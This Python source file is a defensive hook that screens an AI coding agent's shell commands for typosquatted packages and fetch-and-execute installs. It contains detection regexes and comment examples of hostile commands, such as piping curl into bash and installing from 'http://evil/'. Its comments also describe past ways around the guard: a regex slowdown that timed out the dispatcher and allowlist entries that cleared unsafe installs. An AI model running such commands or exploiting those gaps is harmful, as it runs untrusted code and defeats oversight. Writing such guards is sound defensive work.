#!/usr/bin/env python3
"""Supply chain guard for Claude Code Bash commands.

Detects typosquatting and dangerous package-install patterns, returning "ask"
(or "deny" for the zero-false-positive patterns). Imported by
``security_dispatcher``, which owns the stdin/stdout plumbing, allowlist
suppression, and logging.

Installer and fetch-execute patterns are matched against both the raw command
and a normalized form (``normalize_command``) so shell obfuscation
(``p\\ip install``, ``pip${IFS}install``, ``curl ... | no\\de``) cannot evade a
literal-anchored pattern. The allowlist deliberately still sees only the raw
command.
"""

from __future__ import annotations

import re

try:
    from normalize import detection_variants as _detection_variants
except Exception:  # pragma: no cover - fail-open if the module is unavailable
    def _detection_variants(command: str) -> tuple[str, ...]:
        return (command,)


def damerau_levenshtein(s: str, t: str) -> int:
    """Compute Damerau-Levenshtein distance between two strings.

    Supports insertions, deletions, substitutions, and transpositions.
    """
    len_s = len(s)
    len_t = len(t)

    # Short-circuit: if length difference alone exceeds max useful threshold
    if abs(len_s - len_t) > 2:
        return abs(len_s - len_t)

    # Use dict-based approach for the full DL (not optimal substrings)
    d: dict[tuple[int, int], int] = {}
    for i in range(-1, len_s + 1):
        d[i, -1] = i + 1
    for j in range(-1, len_t + 1):
        d[-1, j] = j + 1

    for i in range(len_s):
        for j in range(len_t):
            cost = 0 if s[i] == t[j] else 1
            d[i, j] = min(
                d[i - 1, j] + 1,       # deletion
                d[i, j - 1] + 1,       # insertion
                d[i - 1, j - 1] + cost,  # substitution
            )
            if i > 0 and j > 0 and s[i] == t[j - 1] and s[i - 1] == t[j]:
                d[i, j] = min(d[i, j], d[i - 2, j - 2] + 1)  # transposition

    return d[len_s - 1, len_t - 1]


# Popular packages per ecosystem — DL compares against these
POPULAR_PYPI: frozenset[str] = frozenset([
    "requests", "urllib3", "boto3", "botocore", "setuptools", "pip",
    "certifi", "charset-normalizer", "idna", "typing-extensions",
    "numpy", "packaging", "aiobotocore", "pyyaml", "s3transfer",
    "python-dateutil", "cryptography", "six", "wheel", "jinja2",
    "colorama", "markupsafe", "platformdirs", "pydantic", "pytest",
    "grpcio", "pillow", "protobuf", "filelock", "aiohttp", "attrs",
    "pyasn1", "pandas", "virtualenv", "wrapt", "click", "flask",
    "django", "sqlalchemy", "celery", "redis", "psycopg2", "httpx",
    "beautifulsoup4", "lxml", "scipy", "matplotlib", "scikit-learn",
    "tensorflow", "torch", "transformers", "fastapi", "uvicorn",
    "gunicorn", "black", "ruff", "mypy", "pylint", "flake8",
    "tox", "coverage", "hypothesis", "faker", "rich", "typer",
    "httptools", "orjson", "msgpack", "toml", "tomli",
])

POPULAR_NPM: frozenset[str] = frozenset([
    "lodash", "express", "axios", "react", "react-dom", "next",
    "typescript", "webpack", "babel", "eslint", "prettier",
    "jest", "mocha", "chai", "commander", "chalk", "inquirer",
    "glob", "minimist", "yargs", "dotenv", "cors", "helmet",
    "jsonwebtoken", "bcrypt", "uuid", "moment", "dayjs", "date-fns",
    "socket.io", "mongoose", "sequelize", "prisma", "graphql",
    "apollo-server", "electron", "vue", "angular", "svelte",
    "tailwindcss", "postcss", "sass", "less", "nodemon", "pm2",
    "puppeteer", "playwright", "cypress", "vitest", "esbuild",
    "vite", "rollup", "parcel", "turbo", "nx", "lerna",
    "create-react-app", "create-next-app", "create-vite",
])

POPULAR_CARGO: frozenset[str] = frozenset([
    "tokio", "serde", "serde_json", "reqwest", "clap", "rand",
    "anyhow", "thiserror", "tracing", "hyper", "axum", "actix-web",
    "sqlx", "diesel", "sea-orm", "regex", "rayon", "crossbeam",
    "futures", "async-trait", "tower", "tonic", "prost",
    "chrono", "uuid", "url", "bytes", "log", "env_logger",
    "config", "toml", "once_cell", "lazy_static", "itertools",
    "syn", "quote", "proc-macro2", "cargo-edit", "cargo-watch",
    "ripgrep", "fd-find", "bat", "exa", "starship", "zoxide",
])

# What counts as an install/run of a third-party package, per ecosystem. Both
# typosquat tables below reference these rather than spelling them out again:
# they used to be compiled twice in a different order, so adding a new pip
# front-end to one table and not the other compiled cleanly and silently left
# half the detection behind.
_PIP_INSTALL_RE = re.compile(r"pip3?\s+install\s+")
_PY_TOOL_RE = re.compile(r"(uvx|pipx\s+install|pipx\s+run|uv\s+add|poetry\s+add)\s+")
_NPM_INSTALL_RE = re.compile(r"(npm\s+install|pnpm\s+add|yarn\s+add)\s+")
_NPX_RUN_RE = re.compile(r"(npx|bunx|pnpm\s+dlx|yarn\s+dlx)\s+")
_CARGO_INSTALL_RE = re.compile(r"cargo\s+(install|add)\s+")

# Map installer regex → popular package set
_ECOSYSTEM_MAP: list[tuple[re.Pattern[str], frozenset[str]]] = [
    (_PIP_INSTALL_RE, POPULAR_PYPI),
    (_PY_TOOL_RE, POPULAR_PYPI),
    (_NPM_INSTALL_RE, POPULAR_NPM),
    (_NPX_RUN_RE, POPULAR_NPM),
    (_CARGO_INSTALL_RE, POPULAR_CARGO),
]

TYPOSQUAT_CHECKS: list[tuple[re.Pattern[str], list[tuple[re.Pattern[str], str]]]] = [
    (_PIP_INSTALL_RE, [
        (re.compile(r"requets"), "requests"),
        (re.compile(r"requsts"), "requests"),
        (re.compile(r"request\b"), "requests"),
        (re.compile(r"beautifulsoup\b"), "beautifulsoup4"),
        (re.compile(r"python-dateutil2"), "python-dateutil"),
        (re.compile(r"urlib3"), "urllib3"),
        (re.compile(r"urlib"), "urllib3"),
        (re.compile(r"dateuti"), "python-dateutil"),
        (re.compile(r"colorsama"), "colorama"),
        (re.compile(r"colourama"), "colorama"),
    ]),
    (_NPM_INSTALL_RE, [
        (re.compile(r"loadsh"), "lodash"),
        (re.compile(r"lodahs"), "lodash"),
        (re.compile(r"expres\b"), "express"),
        (re.compile(r"axois"), "axios"),
        (re.compile(r"axos"), "axios"),
        (re.compile(r"recat"), "react"),
        (re.compile(r"reactjs\b"), "react"),
        (re.compile(r"electorn"), "electron"),
    ]),
    (_NPX_RUN_RE, [
        (re.compile(r"loadsh"), "lodash"),
        (re.compile(r"lodahs"), "lodash"),
        (re.compile(r"expres\b"), "express"),
        (re.compile(r"axois"), "axios"),
        (re.compile(r"recat"), "react"),
        (re.compile(r"electorn"), "electron"),
        (re.compile(r"creat-react-app"), "create-react-app"),
        (re.compile(r"create-raect-app"), "create-react-app"),
    ]),
    (_PY_TOOL_RE, [
        (re.compile(r"requets"), "requests"),
        (re.compile(r"beautifulsoup\b"), "beautifulsoup4"),
        (re.compile(r"colorsama"), "colorama"),
        (re.compile(r"colourama"), "colorama"),
        (re.compile(r"rufff"), "ruff"),
    ]),
    (_CARGO_INSTALL_RE, [
        (re.compile(r"tokoi"), "tokio"),
        (re.compile(r"serdee"), "serde"),
        (re.compile(r"reqwests"), "reqwest"),
    ]),
]

# Fetchers and interpreters shared by the fetch-execute detectors below.
# ``wget2`` (the GNU Wget successor) has no word boundary after ``wget``, so it
# is spelled explicitly rather than left to ``wget\b``.
_FETCHER = r"(?:curl|wget2?|fetch|aria2c)"
# ``fetch`` is a real binary (BSD) and also an ordinary English word, and every
# name here appears constantly as data: in a filename (``fetch.log``), inside a
# quoted search pattern (``grep -rn 'curl' docs/``), in prose. Unanchored, the
# alternation read all of those as an invocation, and because the two
# fetch-execute patterns are hard denies that was an unappealable block on
# reading your own logs. The hard-deny patterns use this command-anchored form;
# the ask-severity patterns keep the loose one, where a false positive is a
# prompt rather than a wall.
_CMD_PREFIX = (
    r"(?:^|[;&|(`\n{])\s*"
    r"(?:(?:[A-Za-z_]\w*=\S*|sudo|doas|env|nohup|setsid|stdbuf|time|command|exec)\s+)*"
)
_FETCHER_AT_CMD = _CMD_PREFIX + _FETCHER + r"\b"
# httpie ships ``http``/``https`` CLIs. They are recognized only at command
# position (start of line or right after a shell separator) and when followed by
# whitespace, so a bare URL (``https://…``) or the word "http" inside an argument
# can never be mistaken for the fetcher — that keeps the pipe-to-shell hard deny
# free of false positives.
_HTTPIE = r"(?:^|[;&|(\n{])\s*https?(?=\s)"
_INTERP = (
    r"(?:bash|sh|zsh|dash|ash|ksh|fish|/bin/(?:ba)?sh|python[23]?|python|ruby"
    r"|perl|node|deno|php|pwsh|powershell|tclsh|lua|Rscript|julia|nu|eval)"
)

# Transparent command wrappers: each execs the command that follows it, so an
# interpreter positioned after one still executes the piped fetch. The set is
# kept closed to genuinely pass-through wrappers whose non-flag arguments are the
# command itself, so a non-wrapper such as ``grep`` (or a wrapper with a leading
# non-command arg such as ``timeout 5``) can never sit between the pipe and the
# interpreter and be treated as one — that is what keeps the hard deny
# zero-false-positive.
_PIPE_WRAPPER = r"(?:sudo|doas|env|xargs|nohup|setsid|stdbuf)"
# One prefix unit permitted between the pipe and the interpreter: an environment
# assignment (``PYTHONPATH=/tmp``), a transparent wrapper, or a flag optionally
# consuming a single bareword argument (``sudo -E``, ``xargs -I S``,
# ``sudo -u nobody``). A bareword is only ever consumed as a flag's argument, so
# ``curl ... | grep bash`` (``bash`` as data, not a command) never matches.
_PIPE_PREFIX_UNIT = (
    r"(?:[A-Za-z_]\w*=\S*"
    r"|" + _PIPE_WRAPPER + r"\b"
    r"|-{1,2}\S+(?:\s+[^-\s]\S*)?)"
)

DANGEROUS_INSTALL = {
    "pipe_to_shell": re.compile(
        # fetch piped into an interpreter, tolerating env-assignment and
        # transparent-wrapper prefixes (with their flags) between the pipe and
        # the interpreter: ``| sudo -E bash``, ``| PYTHONPATH=/tmp python3``,
        # ``| xargs -I S sh``. The fetcher may be curl/wget(2)/etc. or an httpie
        # ``http``/``https`` invocation at command position.
        r"(?:" + _FETCHER_AT_CMD + r"|" + _HTTPIE + r")[^\n]{0,2048}?\|\s*(?:"
        + _PIPE_PREFIX_UNIT + r"\s+)*" + _INTERP + r"\b"
    ),
    "fetch_exec_substitution": re.compile(
        # an interpreter (or ``source``/``.``) executing the output of a fetch
        # via $(...), <(...) or a legacy backtick substitution:
        # bash -c "$(curl ...)", source <(curl ...), python3 -c "$(wget ...)",
        # bash -c "`curl ...`", . <(curl ...). The (?<!\w) left-anchor stops a
        # short interpreter token (nu, sh, lua) matching inside a longer word
        # such as ``menu=$(curl …)``.
        r"(?:"
        r"(?<!\w)(?:" + _INTERP + r"|source)\b[^\n]{0,1024}?(?:\$\(|<\(|`)\s*[^\n)]{0,512}"
        r"(?<![\w.-])" + _FETCHER + r"\b"
        r"|"
        # POSIX dot-source of a substituted fetch. The ``.`` must be a bare
        # command (start of line or right after a separator) with the
        # substitution directly after it, so ``. venv/bin/activate`` and
        # ``diff . <(curl …)`` stay clean.
        r"(?:^|[;&|(\n{])\s*\.\s+(?:\$\(|<\(|`)\s*[^\n)]{0,512}\b" + _FETCHER + r"\b"
        r")"
    ),
    "fetch_var_exec": re.compile(
        # fetch captured to a shell variable, then that same variable executed as
        # code by an interpreter (``-c``) or ``eval`` — the assign-then-exec
        # ordering that reverses fetch_exec_substitution:
        #   x=$(curl ...); bash -c "$x"      /      v=`wget ...`; eval "$v"
        # Ask, not deny: the captured value could instead be interpolated as data
        # (``bash script.sh "$x"``), so this is not provably zero-false-positive.
        #
        # The leading ``(?<!\w)`` and the bounded gap runs are load-bearing, not
        # cosmetic. An unanchored ``([A-Za-z_]\w*)=`` restarts inside every
        # position of a long word-character run, consuming greedily and
        # backtracking each time — quadratic. 33 KB of inert padding took 5.06s,
        # so the dispatcher blew its 5s timeout and Claude Code killed it,
        # silently skipping exfil_guard, git_guard and credential_access_guard
        # along with this one. The lookbehind makes an assignment match only at a
        # real word start, which is also what shell syntax means.
        r"(?<!\w)([A-Za-z_]\w{0,64})=(?:\$\(|`)[^\n]{0,256}?\b" + _FETCHER
        + r"\b[^\n]{0,1024}?"
        r"(?<!\w)(?:" + _INTERP + r"\s+(?:-\S+\s+)*-c\b|eval\b)"
        r"[^\n]{0,256}?\$\{?\1\b"
    ),
    "fetch_then_exec": re.compile(
        # download to a file, then run that file — two shapes, both ask (the file
        # is on disk and can be inspected first):
        #   (1) same line, any sequencer after an ``-o``/``-O`` write:
        #       ``curl -o f URL; sh f`` / ``… && …`` / ``… || …`` (keeps the
        #       original -O remote-name coverage).
        #   (2) the SAME downloaded file executed later — across a newline or any
        #       separator, and including a ``>``/``>>`` redirect target.
        #       Correlating on the filename keeps the newline-crossing form from
        #       over-asking on an unrelated later interpreter or a fetched *data*
        #       file consumed as an argument.
        r"(?:"
        + _FETCHER + r"\b[^\n]{0,512}\s-[oO]\b[^\n]{0,512}?(?:&&|\|\||;)[^\n]{0,512}?"
        r"(?<!\w)(?:" + _INTERP + r"|source)\b"
        r"|"
        + _FETCHER + r"\b[^\n]{0,512}?(?:\s-[oO]\s+|>>?\s*)(?P<f>[^\s;&|<>()'`]{1,256})"
        r"[\s\S]{0,2048}?(?<!\w)(?:" + _INTERP + r"|source|\.)\s+(?:-\S+\s+)*"
        r"(?P=f)(?!\w)"
        r")"
    ),
    "pip_url_install": re.compile(
        r"pip3?\s+install\s+https?://"
    ),
    "npm_url_install": re.compile(
        r"npm\s+install\s+https?://"
    ),
    "npx_url_exec": re.compile(
        r"(npx|bunx|pnpm\s+dlx|yarn\s+dlx)\s+https?://"
    ),
    "npx_auto_run": re.compile(
        # npx/bunx/dlx auto-approving a package run via --yes (anywhere) or npx's
        # own -y flag (immediately after the command). Covers scoped AND unscoped
        # names; the explicit ``npx --package=`` form is waved through by the
        # allowlist. -y is only honored as npx's flag in command position, so a
        # trailing ``tool -y`` (the tool's own flag) is not mistaken for it.
        r"(npx|bunx|pnpm\s+dlx|yarn\s+dlx)(?:\s+-y\b|\b[^\n]*\s--yes\b)"
    ),
    "insecure_registry": re.compile(
        # install redirected to a plaintext (http://) package registry/index —
        # the registry-substitution / dependency-confusion vector. https mirrors
        # (pytorch, corporate registries, test indexes) are the legitimate case
        # and are deliberately not matched, so this never over-asks on them.
        r"(?:--registry|--index-url|--extra-index-url)(?:\s+|=)http://"
        r"|(?:pip3?|uv|pipx)\s+(?:pip\s+)?(?:install|add)\b[^\n;&|]*"
        r"\s-i(?:=|\s+)http://"
    ),
    "uvx_url_exec": re.compile(
        r"(uvx|pipx\s+run)\s+https?://"
    ),
    "force_scripts": re.compile(
        r"npm\s+install\s+.*--ignore-scripts\s*=\s*false"
    ),
}

# Every pattern above is about PROVENANCE: where the code came from and whether
# anything vouched for it. Two patterns that were about DESTINATION -- a global
# `pip install`, a `sudo apt-get install` -- used to sit here and are gone.
# Whether an install lands on the host or in a container is a hygiene question
# `container_first.sh` owns, and it answers with a passive reminder rather than a
# prompt; asking it here dressed host untidiness up as a supply-chain finding and
# prompted for it. Nothing about a bare `pip install requests` says anything about
# the package. Provenance, by contrast, a container does not change: an
# arbitrary-URL install, a plaintext registry, a typosquat and a fetch piped to a
# shell all still run untrusted code inside the container, with whatever network
# and mounts it was given.
#
# The command allowlist shrank with them. Four of its five entries -- `pipx
# install`, `uv pip install --require-hashes`, and the two editable `pip install
# -e` spellings -- existed only to wave through that destination ask, and every
# one had become a laundering path for a provenance one: `pipx install
# --index-url http://evil/ pkg` was cleared by them, while the same flag on plain
# `pip install` asked. `npx --package=` stays because `npx_auto_run` above is
# written to rely on it.
ALLOWLIST_PATTERNS = [
    re.compile(r"npx\s+--package="),
]


def is_allowlisted(command: str) -> bool:
    for pattern in ALLOWLIST_PATTERNS:
        if pattern.search(command):
            return True
    return False


# Top-level shell separators, used to bound the command allowlist to the single
# segment that carries a danger. Deliberately naive — it ignores quoting and
# subshells — because the wave-through requires a segment to MATCH an allowlist
# pattern before it can clear a danger, so an over-split only ever makes the
# guard stricter, never more permissive.
_SHELL_SEPARATORS = re.compile(r"\|\||&&|[;|\n]")


def _shell_segments(command: str) -> list[str]:
    """Split a command on top-level shell separators (``;`` ``&&`` ``||`` ``|`` newline)."""
    return [seg for seg in _SHELL_SEPARATORS.split(command) if seg.strip()]


def _segment_matches_pattern(segment: str, pattern_name: str) -> bool:
    """Whether the named dangerous pattern fires on this segment (raw or normalized)."""
    pattern = DANGEROUS_INSTALL.get(pattern_name)
    if pattern is None:
        return False
    for text in _detection_variants(segment):
        if pattern.search(text):
            return True
    return False


def allowlist_clears_danger(command: str, pattern_name: str) -> bool:
    """Whether the command allowlist may wave through a detected danger.

    The allowlist clears a danger ONLY when every shell segment that carries that
    danger is itself allowlisted. A benign allowlisted install in one segment can
    no longer launder a dangerous segment elsewhere in a compound command, and a
    danger that spans separators (fetch-then-exec, fetch-var-exec) — which no
    single segment reproduces — is never cleared.
    """
    carriers = [
        seg for seg in _shell_segments(command)
        if _segment_matches_pattern(seg, pattern_name)
    ]
    if not carriers:
        return False
    return all(is_allowlisted(seg) for seg in carriers)


_PKG_VERSION_STRIP = re.compile(r"[=<>!@\[].*")

# Shell punctuation that can sit against a package name once the command is
# split on whitespace alone. Leaving it attached made every package installed
# inside a quoted body a typosquat OF ITSELF: `bash -c "pip install requests"`
# yields the token `requests"`, which is one edit from `requests`, so the guard
# asked whether the user had meant to type the name they had just typed. It
# fires on every containerized install and every `sh -c` install, which is most
# of them.
_PKG_EDGE_STRIP = re.compile(r"^[\"'`(\\]+|[\"'`);&|\\]+$")

# Where an installer's argument list ends. Everything to the end of the command
# used to count as arguments, so ONE `npx` in a 20-line container script yielded
# 79 candidate package names: every later command word, every redirect target,
# every shell variable, and every word inside a quoted pattern. A theme gate
# running `grep -E "Test Files|Tests |Duration"` contributed the token `Test`,
# one edit from `jest`, so the guard asked about a typosquat that was a grep
# argument. Stripping the quote off the token only moved the symptom — the same
# command previously asked about `vitest";` from an `echo`. An argument list
# ends at the first shell control operator; nothing past it is an argument to
# this installer. Single `&` is deliberately absent: it is legal inside a URL
# query string, and `npm i a & npm i b` is covered by walking every match.
_ARG_LIST_END = re.compile(r"\n|;|\|\||&&|[|<>()]")


def _iter_command_packages(command: str, installer_re: re.Pattern[str]):
    """Yield ``(package_name, installer_text)`` for EVERY installer match.

    Both typosquat passes walk an installer's arguments the same way: take the
    text up to the first shell control operator, split on whitespace, skip flag
    tokens, strip the version/extras suffix. A name that strips to empty is
    skipped — a scoped ``@scope/name`` does that — which is a no-op for the
    known-typo pass, since every typo pattern is a non-empty literal and cannot
    match an empty string.

    Every occurrence is walked, not just the first. Bounding the argument list
    without that would have traded a false positive for a false negative:
    ``npm install lodash && npm install reqeusts`` matched once, and the typo
    was only ever caught because the unbounded walk ran past the separator.
    """
    for match in installer_re.finditer(command):
        installer = match.group(0).strip()
        args = _ARG_LIST_END.split(command[match.end():], 1)[0]
        for pkg in re.split(r"\s+", args.strip()):
            pkg = _PKG_EDGE_STRIP.sub("", pkg)
            if not pkg or pkg.startswith("-"):
                continue
            pkg_clean = _PKG_VERSION_STRIP.sub("", pkg)
            if not pkg_clean:
                continue
            yield (pkg_clean, installer)


def _dl_threshold(name_length: int) -> int:
    """Max edit distance allowed based on package name length."""
    if name_length <= 3:
        return 0  # Too short — exact match only
    if name_length <= 6:
        return 1
    return 2


def _check_dl_against_ecosystem(
    pkg_name: str, popular: frozenset[str],
) -> str | None:
    """Check a package name against popular packages using DL distance.

    Returns the correct popular package name if typosquat detected, else None.
    Skips exact matches (those are legitimate installs).
    """
    if pkg_name in popular:
        return None

    threshold = _dl_threshold(len(pkg_name))
    if threshold == 0:
        return None

    best_match: str | None = None
    best_dist = threshold + 1

    for popular_name in popular:
        # Skip if length difference alone exceeds threshold
        if abs(len(pkg_name) - len(popular_name)) > threshold:
            continue
        dist = damerau_levenshtein(pkg_name, popular_name)
        if dist <= threshold and dist < best_dist:
            best_dist = dist
            best_match = popular_name

    return best_match


def executable_text(command: str) -> str:
    """The part of a command that will actually run.

    Detection patterns are command-shaped, so they must be matched against the
    text that executes. A heredoc body filed away as a commit message or a
    document is not that text: it is a payload this command WRITES. Scanning it
    hard-denied a commit message quoting an attack as the shape to catch.
    """
    try:
        from shell_context import strip_heredocs
    except Exception:  # noqa: BLE001 - anchoring is an FP fix, never a gate
        return command
    try:
        return strip_heredocs(command)
    except Exception:  # noqa: BLE001
        return command


def _scan_texts(command: str) -> tuple[str, ...]:
    """Every text a detection pattern should be matched against.

    The command itself and its normalized form, plus the program body of any
    ``sh -c`` / ``bash -c`` in it -- a body is a command line, and until it was
    scanned as one the hard deny missed ``bash -c "curl … | sh"`` entirely.
    Bodies are bounded, so this cannot multiply the work without limit and blow
    the 5s hook budget, which is itself a security boundary.
    """
    base = executable_text(command)
    texts = list(_detection_variants(base))
    try:
        from shell_context import interpreter_bodies

        for body in interpreter_bodies(base):
            texts.extend(_detection_variants(body))
    except Exception:  # noqa: BLE001 - an extra scan target, never a gate
        pass
    return tuple(texts)


def check_typosquat(command: str) -> tuple[str, str, str] | None:
    """Return (typo, correct_package, installer) or None.

    Scans both the raw command and its normalized form so an installer token
    broken by an escape/quote/``${IFS}`` (``p\\ip install``) is still detected.
    """
    for text in _scan_texts(command):
        result = _check_typosquat_single(text)
        if result:
            return result
    return None


def _check_typosquat_single(command: str) -> tuple[str, str, str] | None:
    """Typosquat detection for a single command string.

    Two-pass detection:
    1. Regex — known-bad typos (zero false positives)
    2. Damerau-Levenshtein — novel typos against popular packages
    """
    # Pass 1: regex (fast, certain)
    for installer_re, typos in TYPOSQUAT_CHECKS:
        for pkg_clean, installer in _iter_command_packages(command, installer_re):
            for typo_re, correct in typos:
                if typo_re.search(pkg_clean):
                    return (pkg_clean, correct, installer)

    # Pass 2: Damerau-Levenshtein (catches novel typos)
    for installer_re, popular in _ECOSYSTEM_MAP:
        for pkg_clean, installer in _iter_command_packages(command, installer_re):
            correct = _check_dl_against_ecosystem(pkg_clean, popular)
            if correct:
                return (pkg_clean, correct, installer)

    return None


HARD_DENY_PATTERNS: frozenset[str] = frozenset([
    "pipe_to_shell",
    "fetch_exec_substitution",
])


_INTERP_NAME_RE = re.compile(r"^" + _INTERP + r"$")
# An interpreter given one of these has a program of its own, so whatever
# arrives on stdin is data rather than the thing being executed.
_PROGRAM_FLAGS = frozenset(["-c", "-m", "--command", "--module"])
_SCRIPT_SUFFIXES = (
    ".py", ".sh", ".bash", ".zsh", ".rb", ".pl", ".js", ".mjs", ".cjs",
    ".lua", ".php", ".ps1", ".r", ".jl", ".tcl", ".nu",
)


def _executes_stdin(text: str, _matched: str) -> bool:
    """True when the piped-to interpreter runs what arrives on stdin.

    ``cat fetch.log | python3 parse.py`` pipes a local file into an interpreter
    that is already running parse.py: stdin is that script's input, not its
    program. That is not fetch-and-execute, and it was a hard deny -- so was
    reporting on your own logs with ``grep -rn 'curl' docs/ | python3 report.py``.

    An interpreter executes stdin only when it is handed no program of its own.
    A script-file argument, ``-c CODE`` and ``-m MODULE`` are all programs;
    ``-s`` explicitly means "read the program from stdin" and settles it.
    """
    try:
        from shell_context import split_segments, tokenize
    except Exception:  # noqa: BLE001 - anchoring is an FP fix, never a gate
        return True
    try:
        tokens = tokenize(split_segments(text)[-1])
        index = None
        for position, token in enumerate(tokens):
            if _INTERP_NAME_RE.match(token.rsplit("/", 1)[-1]):
                index = position
        if index is None:
            return True
        # xargs and parallel exist to turn stdin into the next command's
        # arguments, so an interpreter downstream of one is executing
        # stdin-derived text no matter what its own flags say:
        # ``… | xargs -I S sh -c S`` reaches `sh -c` with the fetched line as
        # its program. Without this the -c rule below would clear a live attack.
        if any(token.rsplit("/", 1)[-1] in ("xargs", "parallel")
               for token in tokens[:index]):
            return True
        rest = tokens[index + 1:]
        if "--" in rest:
            rest = rest[:rest.index("--")]
        for position, token in enumerate(rest):
            if token.startswith("-"):
                if not token.startswith("--") and "s" in token[1:]:
                    return True
                if token in _PROGRAM_FLAGS:
                    return False
                continue
            if position and rest[position - 1] in _PROGRAM_FLAGS:
                return False
            name = token.rsplit("/", 1)[-1].lower()
            if "/" in token or name.endswith(_SCRIPT_SUFFIXES):
                return False
        return True
    except Exception:  # noqa: BLE001 - a broken confirmer must not hide a match
        return True


# Only the hard denies are confirmed. An `ask` that fires on a mention is noise
# the user dismisses; a `deny` that fires on a mention cannot be appealed at all,
# because the dispatcher routes hard denies around both the allowlist and
# per-project suppression.
_POSITIONAL_CONFIRMERS = {
    "pipe_to_shell": _executes_stdin,
}


# Nothing here is platform- or container-scoped any more, and the machinery that
# did that scoping is gone with the two patterns it served. It was substantial --
# a host/container test, a platform test, and a carve-out for `ssh`/`wsl` handing
# an install to a persistent OS elsewhere -- and all of it existed to stop a
# destination question from firing where the destination was fine. Deleting the
# question deletes the need to qualify it: a container cannot clear a provenance
# finding, so no provenance pattern needs asking whether it ran in one.


def check_dangerous(command: str) -> tuple[str, str] | None:
    """Return (pattern_name, matched_text) or None.

    Each pattern is tested against both the raw command and its normalized form,
    so an obfuscated fetch-execute (``curl ... | no\\de``) is still caught.
    Dict order puts the hard-deny patterns first, so a deny wins over an
    overlapping ask on the same command. A hard-deny match is additionally put
    to its positional confirmer, which decides whether the match sits where the
    pattern assumed; errors confirm, so this can never become a false negative.

    Every pattern reaching here is a provenance finding, which is why none of
    them is qualified by where the command runs. A container-awareness test used
    to sit in this loop for the two destination patterns, and it was subtle in a
    way worth remembering: it had to be asked against quote-intact text, because
    normalizing ``container run img sh -c 'apt-get update && apt-get install -y
    jq'`` dissolves the quotes around the body, fragmenting one container segment
    into 42 until the carrier is a bare ``apt-get install`` with no runtime in
    front of it. That is what made the guard tell the user to containerize a
    command that already was. The patterns that needed the test are gone, so the
    test is too.
    """
    variants = _scan_texts(command)
    for name, pattern in DANGEROUS_INSTALL.items():
        confirmer = _POSITIONAL_CONFIRMERS.get(name)
        for text in variants:
            match = pattern.search(text)
            if not match:
                continue
            if confirmer is not None:
                try:
                    if not confirmer(text, match.group(0)):
                        continue
                except Exception:  # noqa: BLE001
                    pass
            return (name, match.group(0))
    return None


DANGER_DESCRIPTIONS = {
    "pipe_to_shell": "Piping remote script directly to shell",
    "fetch_exec_substitution": "Executing fetched content via command/process substitution",
    "fetch_var_exec": "Running a fetched script captured to a shell variable",
    "fetch_then_exec": "Downloading a script to a file and running it in one step",
    "pip_url_install": "Installing Python package from arbitrary URL",
    "npm_url_install": "Installing npm package from arbitrary URL",
    "npx_url_exec": "Executing package from arbitrary URL via npx/bunx",
    "npx_auto_run": "Auto-approving package execution (--yes/-y bypass)",
    "insecure_registry": "Installing from a plaintext (http://) package registry/index",
    "uvx_url_exec": "Executing Python package from arbitrary URL via uvx/pipx",
    "force_scripts": "Force-enabling install scripts (bypasses safety)",
}

DANGER_ALTERNATIVES = {
    "pipe_to_shell": "Download first, inspect, then run: curl -o script.sh URL && cat script.sh && bash script.sh",
    "fetch_exec_substitution": "Download to a file, read it, then run it — never execute a fetch inline via $(...) or <(...)",
    "fetch_var_exec": "Download to a file and inspect it before running — never assign a fetch to a variable and exec it",
    "fetch_then_exec": "Inspect the downloaded file before running it: curl -o s.sh URL && cat s.sh && bash s.sh",
    "pip_url_install": "Use a requirements file with hashes: uv pip install --require-hashes -r requirements.txt",
    "npm_url_install": "Add to package.json and audit: pnpm add <pkg> && pnpm audit",
    "npx_url_exec": "Install the package first with pnpm add, then run locally",
    "npx_auto_run": "Remove --yes/-y to get interactive confirmation, or install the package first",
    "insecure_registry": "Use the default https registry, or verify the http:// index is a trusted internal mirror",
    "uvx_url_exec": "Install with pipx install <pkg> first, then run the installed binary",
    "force_scripts": "Remove --ignore-scripts=false and audit the package first",
}


def format_typosquat_alert(
    typo: str, correct: str, installer: str,
) -> str:
    msg = f"SUPPLY CHAIN GUARD: Possible typosquat\n\n"
    msg += f"Package: {typo}\n"
    msg += f"Did you mean: {correct}\n"
    msg += f"Installer: {installer}\n\n"
    msg += "Before approving:\n"
    msg += f"- Verify the package name is correct (not '{correct}'?)\n"
    msg += "- Check the package on the registry for download count/age\n"
    msg += "- Typosquatting is a common supply chain attack vector"
    return msg


def format_danger_alert(pattern_name: str, matched_text: str) -> str:
    desc = DANGER_DESCRIPTIONS.get(pattern_name, "Dangerous install pattern")
    alt = DANGER_ALTERNATIVES.get(pattern_name, "Consider a safer alternative")
    msg = f"SUPPLY CHAIN GUARD: {desc}\n\n"
    msg += f"Pattern: {pattern_name}\n"
    msg += f"Matched: {matched_text[:120]}\n\n"
    msg += "Before approving:\n"
    msg += "- Is this source trusted and verified?\n"
    msg += "- Could this install malicious code?\n"
    msg += f"- Safer alternative: {alt}"
    return msg
